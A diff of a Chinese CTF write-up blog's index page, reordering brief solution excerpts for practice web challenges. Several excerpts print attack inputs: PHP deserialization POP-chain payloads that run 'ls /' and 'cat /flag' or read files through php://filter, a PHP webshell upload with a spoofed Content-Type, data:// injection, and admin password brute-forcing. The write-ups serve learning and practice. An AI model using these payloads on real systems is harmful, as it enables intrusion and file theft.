@@ -181,8 +181,8 @@
         
 
 <div class="post">
-    <a href="/2026/02/08/2026-02-08-%E9%9B%AA%E5%B1%B1%E7%9A%84%E7%A7%98%E5%AF%86/">
-        <h2 class="post-title">雪山的秘密</h2>
+    <a href="/2026/02/08/2026-02-08-popchains/">
+        <h2 class="post-title">popchains</h2>
     </a>
     <div class="category-and-date">
         
@@ -198,9 +198,9 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p>附件是一段摩斯密码音频解码后得到</p>
-<p>3.2-..3-.23-.32-32.-3..-&#x2F;..2-223-.32-322-..3-..2-&#x2F;2.2-3..-232-223-..2-.32-&#x2F;3.2-..3-.23-3.3-..3-&#x2F;.32-32.-322-.3.-&#x2F;.3.-33.-22.-23.-..3-.23-..2-3..-&#x2F;.2.-..3-2.2-3..-.23-&#x2F;23.-.33-.32-2.2-3..-&#x2F;3.2-223-322-332-3..-233这里三进制转换再凯撒偏移14得到再根据flag的格式得到flag</p>
-<p>NSSCTF{FOR_THE_NATION_WE_CANT_FORGO_THIS_SKYBORNE_POWER_BUT_WE_FAILED}</p>
+            <p>这里得到flag的执行逻辑 触发__wakeup()-&gt;触发__toString()-&gt;触发__get()-&gt;触发__invoke()-&gt;include($value);构造payload：</p>
+<p>O:12:”Road_is_Long”:2:{s:4:”page”;r:1;s:6:”string”;O:13:”Make_a_Change”:1:{s:6:”effort”;O:13:”Try_Work_Hard”:1:{s:6:”var”;s:49:”php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag”;}}编码后输入得到flag的base64编码然后解码得到flag</p>
+<p><img src="/images/writeups/popchains_e3e0bee5.png" alt="popchains_e3e0bee5"></p>
 
             
         </div>
@@ -218,100 +218,13 @@
             <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
         </span>
         
-    </div>
-    <a href="/2026/02/08/2026-02-08-%E9%9B%AA%E5%B1%B1%E7%9A%84%E7%A7%98%E5%AF%86/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2026/02/07/2026-02-07-UnS3rialize/">
-        <h2 class="post-title">UnS3rialize</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2026/2/7
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h3 id="根据题目得出流程-反序列化开始-destruct-destruct-toString-get-invoke-执行命令"><a href="#根据题目得出流程-反序列化开始-destruct-destruct-toString-get-invoke-执行命令" class="headerlink" title="根据题目得出流程 反序列化开始-&gt;__destruct()-&gt; __destruct() -&gt;__toString() -&gt; __get() -&gt;__invoke() -&gt;执行命令"></a>根据题目得出流程 反序列化开始-&gt;__destruct()-&gt; __destruct() -&gt;__toString() -&gt; __get() -&gt;__invoke() -&gt;执行命令</h3><p>构造payload：</p>
-<p>O:1:”F”:3:{s:4:”user”;s:4:”SWPU”;s:6:”passwd”;s:3:”NSS”;s:5:”notes”;O:1:”T”:1:{s:3:”sth”;O:1:”C”:1:{s:6:”whoami”;O:3:”NSS”:2:{s:3:”cmd”;s:4:”ls &#x2F;“;}}}}</p>
-<p>Base64编码后输入发现flag</p>
-<p>O:1:”F”:3:{s:4:”user”;s:4:”SWPU”;s:6:”passwd”;s:3:”NSS”;s:5:”notes”;O:1:”T”:1:{s:3:”sth”;O:1:”C”:1:{s:6:”whoami”;O:3:”NSS”:2:{s:3:”cmd”;s:9:”cat &#x2F;flag”;}}}}</p>
-<p>得到flag</p>
-<p><img src="/images/writeups/UnS3rialize_d24e6780.png" alt="UnS3rialize_d24e6780"></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
+            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #ff7d73">反序列化</a>
         </span>
         
     </div>
-    <a href="/2026/02/07/2026-02-07-UnS3rialize/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2026/02/07/2026-02-07-easycms/">
-        <h2 class="post-title">easycms</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2026/2/7
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>这到题尝试&#x2F;admin进入后台看看，进入后台界面，猜测用户名admin然后爆破得到密码12345</p>
-<p>发现可以下载文件，查看下载链接发现经过md5加密发现被base64加密了，解码发现是绝对路径，用&#x2F;flag，base64后尝试能不能下载到，下载到flag.zip但是打不开改成.txt得到flag</p>
-<p><img src="/images/writeups/easycms_48670145.png" alt="easycms_48670145"></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/CMS/" style="color: #00a596">CMS</a>
-        </span>
-        
-    </div>
-    <a href="/2026/02/07/2026-02-07-easycms/" class="go-post">阅读全文</a>
+    <a href="/2026/02/08/2026-02-08-popchains/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -358,11 +271,103 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
         </span>
         
     </div>
     <a href="/2026/02/07/2026-02-07-join-us/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/02/07/2026-02-07-easycms/">
+        <h2 class="post-title">easycms</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/2/7
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>这到题尝试&#x2F;admin进入后台看看，进入后台界面，猜测用户名admin然后爆破得到密码12345</p>
+<p>发现可以下载文件，查看下载链接发现经过md5加密发现被base64加密了，解码发现是绝对路径，用&#x2F;flag，base64后尝试能不能下载到，下载到flag.zip但是打不开改成.txt得到flag</p>
+<p><img src="/images/writeups/easycms_48670145.png" alt="easycms_48670145"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/CMS/" style="color: #ff7d73">CMS</a>
+        </span>
+        
+    </div>
+    <a href="/2026/02/07/2026-02-07-easycms/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/02/07/2026-02-07-UnS3rialize/">
+        <h2 class="post-title">UnS3rialize</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/2/7
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h3 id="根据题目得出流程-反序列化开始-destruct-destruct-toString-get-invoke-执行命令"><a href="#根据题目得出流程-反序列化开始-destruct-destruct-toString-get-invoke-执行命令" class="headerlink" title="根据题目得出流程 反序列化开始-&gt;__destruct()-&gt; __destruct() -&gt;__toString() -&gt; __get() -&gt;__invoke() -&gt;执行命令"></a>根据题目得出流程 反序列化开始-&gt;__destruct()-&gt; __destruct() -&gt;__toString() -&gt; __get() -&gt;__invoke() -&gt;执行命令</h3><p>构造payload：</p>
+<p>O:1:”F”:3:{s:4:”user”;s:4:”SWPU”;s:6:”passwd”;s:3:”NSS”;s:5:”notes”;O:1:”T”:1:{s:3:”sth”;O:1:”C”:1:{s:6:”whoami”;O:3:”NSS”:2:{s:3:”cmd”;s:4:”ls &#x2F;“;}}}}</p>
+<p>Base64编码后输入发现flag</p>
+<p>O:1:”F”:3:{s:4:”user”;s:4:”SWPU”;s:6:”passwd”;s:3:”NSS”;s:5:”notes”;O:1:”T”:1:{s:3:”sth”;O:1:”C”:1:{s:6:”whoami”;O:3:”NSS”:2:{s:3:”cmd”;s:9:”cat &#x2F;flag”;}}}}</p>
+<p>得到flag</p>
+<p><img src="/images/writeups/UnS3rialize_d24e6780.png" alt="UnS3rialize_d24e6780"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
+        </span>
+        
+    </div>
+    <a href="/2026/02/07/2026-02-07-UnS3rialize/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -399,7 +404,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
         </span>
         
     </div>
@@ -447,7 +452,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
         </span>
         
     </div>
@@ -515,7 +520,7 @@ class Flag{  //flag.php
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
         </span>
         
     </div>
@@ -559,57 +564,16 @@ class Flag{  //flag.php
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="color: #00a596">SQL注入</a>
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="color: #00bcd4">SQL注入</a>
         </span>
         
     </div>
     <a href="/2026/02/06/2026-02-06-SQL/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2026/02/06/2026-02-06-PseudoProtocols/">
-        <h2 class="post-title">PseudoProtocols</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2026/2/6
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p><code>题目问我们能找到hint.php这里发现url中有一个?wllm=,尝试读取php://filter/read=convert.base64-encode/resource=hint.php，解码后发现让我们去/test2222222222222.php，打开发现要得到一个a文件内容是I want flag，这里用data协议a=data://text/plain,I want flag成功得到flag</code></p>
-<p>&#96;&#96;</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
-        </span>
-        
-    </div>
-    <a href="/2026/02/06/2026-02-06-PseudoProtocols/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -647,11 +611,52 @@ class Flag{  //flag.php
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
         </span>
         
     </div>
     <a href="/2026/02/06/2026-02-06-jicao/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/02/06/2026-02-06-%E6%98%AF%E5%85%84%E5%BC%9F%E5%B0%B1%E6%9D%A5%E4%BC%A0%E4%BD%A0%E3%81%AE/">
+        <h2 class="post-title">是兄弟，就来传你の！</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/2/6
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>试了一圈只有pht可以上传,用pht文件执行命令得到文件GIF&lt;?&#x3D;nl &#x2F;f*;然后抓包修改Content-Type上传再访问上传地址得到flag</p>
+<p><img src="/images/writeups/%E6%98%AF%E5%85%84%E5%BC%9F%E5%B0%B1%E6%9D%A5%E4%BC%A0%E4%BD%A0%E3%81%AE_8366503e.png" alt="是兄弟就来传你の_8366503e"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
+        </span>
+        
+    </div>
+    <a href="/2026/02/06/2026-02-06-%E6%98%AF%E5%85%84%E5%BC%9F%E5%B0%B1%E6%9D%A5%E4%BC%A0%E4%BD%A0%E3%81%AE/" class="go-post">阅读全文</a>
 </div>
 
 
@@ -695,7 +700,7 @@ class Flag{  //flag.php
         </div>
         <div class="name">youbing</div>
         <div class="description">
-            <p>你好！我是 Coder<br>这是我的技术博客<br>分享编程学习笔记和生活记录</p>
+            <p>你好！我是 youbing<br>这是我的技术博客<br>分享编程学习笔记和生活记录</p>
 
         </div>
         
@@ -710,7 +715,7 @@ class Flag{  //flag.php
             </span>
             
             <span class="icon-link">
-                <a target="_blank" rel="noopener" href="https://github.com/Youbing3432213764-coder">
+                <a target="_blank" rel="noopener" href="https://github.com/youbing3432213764-coder">
                     <i
                         class="fa-brands fa-github fa-fw"
                     ></i>
